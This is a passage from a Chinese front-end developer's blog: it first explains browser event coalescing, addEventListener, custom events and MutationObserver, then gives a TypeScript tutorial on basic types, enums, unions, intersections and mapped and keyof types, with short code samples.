<h3 id="减少发送给主线程的事件数量"><a href="#减少发送给主线程的事件数量" class="headerlink" title="减少发送给主线程的事件数量"></a>减少发送给主线程的事件数量</h3><p>为了保证动画的顺畅，需要显示器在每秒刷新 60 次。对于典型的触摸事件由合成线程提交给主线程的事件频率可以达到每秒 60-120 次，对于典型的鼠标事件每秒会发送 100 次。事件发送的频率通常比屏幕刷新频率要高。<br>如果类似 touchmove 这样的事件每秒向主线程发送 120 次可能会造成主线程执行时间过长而影响性能。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630293794681-2144b7ad-3be5-4044-9a60-48936c26ff93.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ua8743b4b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=992&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=43821&status=done&style=none&taskId=ud5c2019b-ae92-4b0d-aeb9-02c282ebd05&title=" alt="image.png"><br>为了减少发送给主线程的事件数量，Chrome 合并了连续的事件。类似 wheel，mousewheel，mousemove，pointermove，touchmove 这样的事件会被延迟到下一次 requestAnimationFrame 前触发.<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630293799028-18e8ec06-8628-42e4-95e8-29ce5a60fd50.png#clientId=u113a7264-6512-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u34871593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=292&originWidth=992&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=51417&status=done&style=none&taskId=u109afd44-9fe6-495b-b4d6-53d96fa4e16&title=" alt="image.png"><br>而任何的离散事件，类似 keydown, keyup, mouseup, mousedown, touchstart 和 touchend 都会立即被发送给主线程处理。</p>
<h3 id="相关方法"><a href="#相关方法" class="headerlink" title="相关方法"></a>相关方法</h3><h4 id="EventTarget-addEventListener"><a href="#EventTarget-addEventListener" class="headerlink" title="EventTarget.addEventListener()"></a>EventTarget.addEventListener()</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">target.<span class="title function_">addEventListener</span>(</span><br><span class="line">  type,</span><br><span class="line">  listener,</span><br><span class="line">  (options = &#123; <span class="attr">capture</span>: <span class="literal">false</span>, <span class="attr">once</span>: <span class="literal">false</span>, <span class="attr">passive</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">);</span><br><span class="line">target.<span class="title function_">addEventListener</span>(type, listener, (useCapture = <span class="literal">false</span>));</span><br></pre></td></tr></table></figure>

<p>addEventListener() 是 W3C DOM 规范中提供的注册事件监听器的方法。<br><strong>优点</strong></p>
<ul>
<li>它允许给一个事件注册多个监听器。 特别是在使用 AJAX 库，JavaScript 模块，或其他需要第三方库/插件的代码。</li>
<li>它提供了一种更精细的手段控制 listener 的触发阶段。（即可以选择捕获或者冒泡）。</li>
<li>它对任何 DOM 元素都是有效的，而不仅仅只对 HTML 元素有效。</li>
</ul>
<p><strong>passive</strong><br>设置为 true 时，表示 listener 永远不会调用 preventDefault()，可以有效处理默认行为阻塞主线程的行为，提升移动端等场景下性能。<br>​</p>
<h4 id="new-Event"><a href="#new-Event" class="headerlink" title="new Event()"></a>new Event()</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义事件</span></span><br><span class="line"><span class="keyword">let</span> event = <span class="keyword">new</span> <span class="title class_">Event</span>(</span><br><span class="line">  typeArg,</span><br><span class="line">  (eventInit = &#123; <span class="attr">bubbles</span>: <span class="literal">false</span>, <span class="attr">cancelable</span>: <span class="literal">false</span>, <span class="attr">composed</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 监听事件</span></span><br><span class="line"><span class="title class_">EventTarget</span>.<span class="title function_">addEventListener</span>(typeArg, <span class="function">() =&gt;</span> &#123;&#125;, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 触发事件</span></span><br><span class="line"><span class="title class_">EventTarget</span>.<span class="title function_">dispatchEvent</span>(event);</span><br></pre></td></tr></table></figure>

<ul>
<li>bubbles 表示该事件是否冒泡。</li>
<li>cancelable 表示该事件能否被取消。</li>
<li>composed 指示事件是否会在影子 DOM 根节点之外触发侦听器。</li>
</ul>
<p>用于自定义事件和触发事件<br>​</p>
<h4 id="MutationObserver"><a href="#MutationObserver" class="headerlink" title="MutationObserver()"></a>MutationObserver()</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建观察器实例</span></span><br><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(</span><br><span class="line">  (callback = <span class="function">(<span class="params">mutationsList, observer</span>) =&gt;</span> &#123;&#125;)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 以一定配置观察目标节点</span></span><br><span class="line">observer.<span class="title function_">observe</span>(targetNode, &#123;</span><br><span class="line">  <span class="attr">childList</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">subtree</span>: tree,</span><br><span class="line">  <span class="attr">attributes</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 停止观察</span></span><br><span class="line">observer.<span class="title function_">disconnet</span>();</span><br></pre></td></tr></table></figure>

<p>监控 DOM 树变化</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/5d36d123bfd1c56688e125ad3">https://xie.infoq.cn/article/5d36d123bfd1c56688e125ad3</a><br><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/9cf7bd9dfca63acb2e4aaabf8">https://xie.infoq.cn/article/9cf7bd9dfca63acb2e4aaabf8</a><br><a target="_blank" rel="noopener" href="https://blog.poetries.top/browser-working-principle/">https://blog.poetries.top/browser-working-principle/</a><br><a target="_blank" rel="noopener" href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#The_main_flow">https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#The_main_flow</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/27/TypeScript/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/27/TypeScript/" class="post-title-link" itemprop="url">TypeScript</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-27 17:00:31" itemprop="dateCreated datePublished" datetime="2021-08-27T17:00:31+08:00">2021-08-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:05" itemprop="dateModified" datetime="2022-02-14T19:41:05+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>基础类型、接口、泛型、类、函数、对象、声明</p>
<h2 id="基础类型"><a href="#基础类型" class="headerlink" title="基础类型"></a>基础类型</h2><h3 id="布尔值、数字"><a href="#布尔值、数字" class="headerlink" title="布尔值、数字"></a>布尔值、数字</h3><p>同 JS</p>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>字符串字面量类型用来约束取值只能是某几个字符串中的一个。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">EventNames</span> = <span class="string">&#x27;click&#x27;</span> | <span class="string">&#x27;scroll&#x27;</span> | <span class="string">&#x27;mousemove&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleEvent</span>(<span class="params">ele: Element, event: EventNames</span>) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">handleEvent</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hello&#x27;</span>), <span class="string">&#x27;scroll&#x27;</span>);  <span class="comment">// 没问题</span></span><br><span class="line"><span class="title function_">handleEvent</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;world&#x27;</span>), <span class="string">&#x27;dbclick&#x27;</span>);/ 报错，event 不能为 <span class="string">&#x27;dbclick&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="元组（Tuple）"><a href="#元组（Tuple）" class="headerlink" title="元组（Tuple）"></a>元组（Tuple）</h3><p>表示已知元素数量和类型的数组</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Declare a tuple type</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">x</span>: [<span class="built_in">string</span>, <span class="built_in">number</span>];</span><br><span class="line"><span class="comment">// Initialize it</span></span><br><span class="line">x = [<span class="string">&quot;hello&quot;</span>, <span class="number">10</span>];</span><br></pre></td></tr></table></figure>

<p>当访问一个越界的元素，会使用联合类型替代：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x[<span class="number">3</span>] = <span class="string">&quot;world&quot;</span>; <span class="comment">// OK, 字符串可以赋值给(string | number)类型</span></span><br><span class="line">x[<span class="number">6</span>] = <span class="literal">true</span>; <span class="comment">// Error, 布尔不是(string | number)类型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x[<span class="number">5</span>].<span class="title function_">toString</span>()); <span class="comment">// OK, &#x27;string&#x27; 和 &#x27;number&#x27; 都有 toString</span></span><br></pre></td></tr></table></figure>

<h3 id="枚举（enum）"><a href="#枚举（enum）" class="headerlink" title="枚举（enum）"></a>枚举（enum）</h3><p>自定义索引的数组，为一组数值赋予友好的名字。用于取值被限定在一定范围内的场景，比如一周只能有七天，颜色限定为红绿蓝等<br>TypeScript 区分了三种指定枚举成员值的方式：</p>
<ul>
<li>使用字面量进行初始化：<ul>
<li>隐式指定；</li>
<li>通过数字字面量或字符串字面量。</li>
</ul>
</li>
<li>常量枚举成员通过可在编译时计算其结果的表达式初始化。</li>
<li>计算的枚举成员可通过任意表达式初始化。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  <span class="title class_">Red</span>,</span><br><span class="line">  <span class="title class_">Green</span>,</span><br><span class="line">  <span class="title class_">Blue</span>,</span><br><span class="line">&#125; <span class="comment">// 从0开始，0,1,2；Color[Color[&quot;Red&quot;] = 0] = &quot;Red&quot;;</span></span><br><span class="line"><span class="built_in">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  <span class="title class_">Red</span> = <span class="number">1</span>,</span><br><span class="line">  <span class="title class_">Green</span>,</span><br><span class="line">  <span class="title class_">Blue</span>,</span><br><span class="line">&#125; <span class="comment">// 从1开始，1,2,3；</span></span><br><span class="line"><span class="built_in">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  <span class="title class_">Red</span> = <span class="number">1</span>,</span><br><span class="line">  <span class="title class_">Green</span> = <span class="number">2</span>,</span><br><span class="line">  <span class="title class_">Blue</span> = <span class="number">4</span>,</span><br><span class="line">&#125; <span class="comment">// 1,2,4；</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">c</span>: <span class="title class_">Color</span> = <span class="title class_">Color</span>.<span class="property">Green</span>; <span class="comment">//2</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">colorName</span>: <span class="built_in">string</span> = <span class="title class_">Color</span>[<span class="number">2</span>]; <span class="comment">//由枚举的值得到它的名字 Green</span></span><br></pre></td></tr></table></figure>

<h4 id="字符串枚举"><a href="#字符串枚举" class="headerlink" title="字符串枚举"></a>字符串枚举</h4><p>字符串枚举的概念很简单，但是有细微的<a target="_blank" rel="noopener" href="https://zhongsp.gitbooks.io/typescript-handbook/content/doc/handbook/Enums.html#enums-at-runtime">运行时的差别</a>。 在一个字符串枚举里，每个成员都必须用字符串字面量，或另外一个字符串枚举成员进行初始化。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">  <span class="title class_">Up</span> = <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">  <span class="title class_">Down</span> = <span class="string">&quot;DOWN&quot;</span>,</span><br><span class="line">  <span class="title class_">Left</span> = <span class="string">&quot;LEFT&quot;</span>,</span><br><span class="line">  <span class="title class_">Right</span> = <span class="string">&quot;RIGHT&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于字符串枚举没有自增长的行为，字符串枚举可以很好的序列化。 换句话说，如果你正在调试并且必须要读一个数字枚举的运行时的值，这个值通常是很难读的 - 它并不能表达有用的信息（尽管<a target="_blank" rel="noopener" href="https://zhongsp.gitbooks.io/typescript-handbook/content/doc/handbook/Enums.html#enums-at-runtime">反向映射</a>会有所帮助），字符串枚举允许你提供一个运行时有意义的并且可读的值，独立于枚举成员的名字。<br>​</p>
<h4 id="反向映射"><a href="#反向映射" class="headerlink" title="反向映射"></a>反向映射</h4><p>除了创建一个以属性名做为对象成员的对象之外，数字枚举成员还具有了 反向映射，从枚举值到枚举名字。生成的代码中，枚举类型被编译成一个对象，它包含了正向映射（ name -&gt; value）和反向映射（ value -&gt; name）。 引用枚举成员总会生成为对属性访问并且永远也不会内联代码。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enum</span> <span class="title class_">Enum</span> &#123;</span><br><span class="line">  A,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span class="title class_">Enum</span>.<span class="property">A</span>;</span><br><span class="line"><span class="keyword">let</span> nameOfA = <span class="title class_">Enum</span>[a]; <span class="comment">// &quot;A&quot;</span></span><br><span class="line"><span class="comment">// 编译后</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Enum</span>;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">Enum</span>) &#123;</span><br><span class="line">  <span class="title class_">Enum</span>[(<span class="title class_">Enum</span>[<span class="string">&quot;A&quot;</span>] = <span class="number">0</span>)] = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">&#125;)(<span class="title class_">Enum</span> || (<span class="title class_">Enum</span> = &#123;&#125;));</span><br><span class="line"><span class="keyword">var</span> a = <span class="title class_">Enum</span>.<span class="property">A</span>;</span><br><span class="line"><span class="keyword">var</span> nameOfA = <span class="title class_">Enum</span>[a]; <span class="comment">// &quot;A&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="任意值-any"><a href="#任意值-any" class="headerlink" title="任意值 any"></a>任意值 any</h3><p>使用<code>any</code>类型来标记不希望被类型检查器检查而直接通过编译阶段检查的变量。<br>允许你在编译时可选择地包含或移除类型检查。 你可能认为<code>Object</code>有相似的作用，就像它在其它语言中那样。 但是<code>Object</code>类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">notSure</span>: <span class="built_in">any</span> = <span class="number">4</span>;</span><br><span class="line">notSure.<span class="title function_">ifItExists</span>(); <span class="comment">// okay, ifItExists might exist at runtime</span></span><br><span class="line">notSure.<span class="title function_">toFixed</span>(); <span class="comment">// okay, toFixed exists (but the compiler doesn&#x27;t check)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">prettySure</span>: <span class="title class_">Object</span> = <span class="number">4</span>;</span><br><span class="line">prettySure.<span class="title function_">toFixed</span>(); <span class="comment">// Error: Property &#x27;toFixed&#x27; doesn&#x27;t exist on type &#x27;Object&#x27;.</span></span><br></pre></td></tr></table></figure>

<h3 id="空值-void"><a href="#空值-void" class="headerlink" title="空值 void"></a>空值 void</h3><p>当一个函数没有返回值时，你通常会见到其返回值类型是<code>void</code>：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">warnUser</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;This is my warning message&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>void</code>类型的变量只能赋予为<code>undefined</code>和<code>null</code>：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">unusable</span>: <span class="built_in">void</span> = <span class="literal">undefined</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Null-和-Undefined"><a href="#Null-和-Undefined" class="headerlink" title="Null 和 Undefined"></a>Null 和 Undefined</h3><p>默认情况下<code>null</code>和<code>undefined</code>是所有类型的子类型。 就是说你可以把<code>null</code>和<code>undefined</code>赋值给<code>number</code>类型的变量。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Not much else we can assign to these variables!</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">u</span>: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">n</span>: <span class="literal">null</span> = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Never"><a href="#Never" class="headerlink" title="Never"></a>Never</h3><p><code>never</code>类型表示的是那些永不存在的值的类型。 例如，<code>never</code>类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型； 变量也可能是<code>never</code>类型，当它们被永不为真的类型保护所约束时。<br><code>never</code>类型是任何类型的子类型，也可以赋值给任何类型；然而，<em>没有</em>类型是<code>never</code>的子类型或可以赋值给<code>never</code>类型（除了<code>never</code>本身之外）。 即使<code>any</code>也不可以赋值给<code>never</code>。<br>下面是一些返回<code>never</code>类型的函数：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回never的函数必须存在无法达到的终点</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">error</span>(<span class="params">message: <span class="built_in">string</span></span>): <span class="built_in">never</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推断的返回值类型为never</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">error</span>(<span class="string">&quot;Something failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回never的函数必须存在无法达到的终点</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">infiniteLoop</span>(<span class="params"></span>): <span class="built_in">never</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="联合类型（Union-Types）"><a href="#联合类型（Union-Types）" class="headerlink" title="联合类型（Union Types）"></a>联合类型（Union Types）</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">myFavoriteNumber</span>: <span class="built_in">string</span> | <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dinner</span>要么有 fish 要么有 bear</span><br><span class="line"><span class="comment">// 🙁 Not good.</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Dinner1</span> &#123;</span><br><span class="line">  fish?: <span class="built_in">number</span>,</span><br><span class="line">  bear?: <span class="built_in">number</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 🙂 Awesome!</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Dinner2</span> = &#123;</span><br><span class="line">  <span class="attr">fish</span>: <span class="built_in">number</span>,</span><br><span class="line">&#125; | &#123;</span><br><span class="line">  <span class="attr">bear</span>: <span class="built_in">number</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先定义全量列表，再获取枚举类型</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DRINK_LIST</span> = [<span class="string">&#x27;Beer&#x27;</span>, <span class="string">&#x27;Wine&#x27;</span>, <span class="string">&#x27;Water&#x27;</span>] <span class="keyword">as</span> <span class="keyword">const</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Drink</span> = (<span class="keyword">typeof</span> <span class="variable constant_">DRINK_LIST</span>)[<span class="built_in">number</span>]; <span class="comment">// Equals to &#x27;Beer&#x27; | &#x27;Wine&#x27; | &#x27;Water&#x27;.</span></span><br></pre></td></tr></table></figure>

<h2 id="交叉类型（Intersection-Types）"><a href="#交叉类型（Intersection-Types）" class="headerlink" title="交叉类型（Intersection Types）"></a>交叉类型（Intersection Types）</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Dinner</span> = &#123;</span><br><span class="line">  <span class="attr">meet</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125; &amp; &#123;</span><br><span class="line">  <span class="attr">vegetable</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h2><p>类型断言好比其它语言里的类型转换，把变量当做断言的类型，但是不进行特殊的数据检查和解构。 它没有运行时的影响，只是在编译阶段起作用。类型断言不是类型转换，只能断言成一个联合类型或 any 中的类型。<br>类型断言有两种形式。 其一是“尖括号”语法：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">someValue</span>: <span class="built_in">any</span> = <span class="string">&quot;this is a string&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">strLength</span>: <span class="built_in">number</span> = (&lt;<span class="built_in">string</span>&gt;someValue).<span class="property">length</span>;</span><br></pre></td></tr></table></figure>

<p>另一个为<code>as</code>语法：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">someValue</span>: <span class="built_in">any</span> = <span class="string">&quot;this is a string&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">strLength</span>: <span class="built_in">number</span> = (someValue <span class="keyword">as</span> <span class="built_in">string</span>).<span class="property">length</span>;</span><br></pre></td></tr></table></figure>

<p>两种形式是等价的。 至于使用哪个大多数情况下是凭个人喜好；然而，当你在 TypeScript 里使用 JSX 时，只有<code>as</code>语法断言是被允许的。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">ro</span>: <span class="title class_">ReadonlyArray</span>&lt;<span class="built_in">number</span>&gt; = a;</span><br><span class="line">a = ro; <span class="comment">// error! Readonly</span></span><br><span class="line">a = ro <span class="keyword">as</span> <span class="built_in">number</span>[]; <span class="comment">// 用类型断言重写</span></span><br></pre></td></tr></table></figure>

<h3 id="映射类型（in）"><a href="#映射类型（in）" class="headerlink" title="映射类型（in）"></a>映射类型（in）</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Keys</span> = <span class="string">&quot;option1&quot;</span> | <span class="string">&quot;option2&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Flags</span> = &#123; [K <span class="keyword">in</span> <span class="title class_">Keys</span>]: <span class="built_in">boolean</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Flags</span> = &#123;</span><br><span class="line">  <span class="attr">option1</span>: <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="attr">option2</span>: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="查找类型（keyof）"><a href="#查找类型（keyof）" class="headerlink" title="查找类型（keyof）"></a>查找类型（keyof）</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">location</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">K1</span> = keyof <span class="title class_">Person</span>; <span class="comment">// &quot;name&quot; | &quot;age&quot; | &quot;location&quot;</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">K2</span> = keyof <span class="title class_">Person</span>[]; <span class="comment">// &quot;length&quot; | &quot;push&quot; | &quot;pop&quot; | &quot;concat&quot; | ...</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">K3</span> = keyof &#123; [<span class="attr">x</span>: <span class="built_in">string</span>]: <span class="title class_">Person</span> &#125;; <span class="comment">// string</span></span><br></pre></td></tr></table></figure>

